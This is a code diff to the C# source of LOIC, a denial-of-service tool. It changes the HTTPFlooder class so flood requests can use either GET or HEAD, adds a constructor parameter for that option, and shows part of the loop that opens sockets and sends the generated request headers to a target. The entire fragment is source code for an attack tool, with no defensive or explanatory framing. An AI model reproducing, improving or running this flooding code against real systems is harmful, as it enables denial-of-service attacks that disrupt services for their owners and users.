@@ -23,10 +23,11 @@ namespace LOIC
 		private readonly int Port;
 		private readonly string Subsite;
 		private readonly bool Resp;
-		private readonly bool AllowRandom;
+		private readonly bool Random;
+		private readonly bool UseGet;
 		private readonly bool AllowGzip;
 
-		public HTTPFlooder(string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool gzip)
+		public HTTPFlooder(string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool useget, bool gzip)
 		{
 			this.Host = (host == "") ? ip : host;
 			this.IP = ip;
@@ -35,7 +36,8 @@ namespace LOIC
 			this.Resp = resp;
 			this.Delay = delay;
 			this.Timeout = timeout * 1000;
-			this.AllowRandom = random;
+			this.Random = random;
+			this.UseGet = useget;
 			this.AllowGzip = gzip;
 		}
 		public override void Start()
@@ -90,7 +92,7 @@ namespace LOIC
 						try { socket.Connect(RHost); }
 						catch(SocketException) { goto _continue; }
 
-						byte[] buf = Functions.RandomHttpHeader("GET", Subsite, Host, AllowRandom, AllowGzip);
+						byte[] buf = Functions.RandomHttpHeader((UseGet ? "GET" : "HEAD"), Subsite, Host, Random, AllowGzip);
 
 						socket.Blocking = Resp;
 						State = ReqState.Requesting; // SET STATE TO REQUESTING //
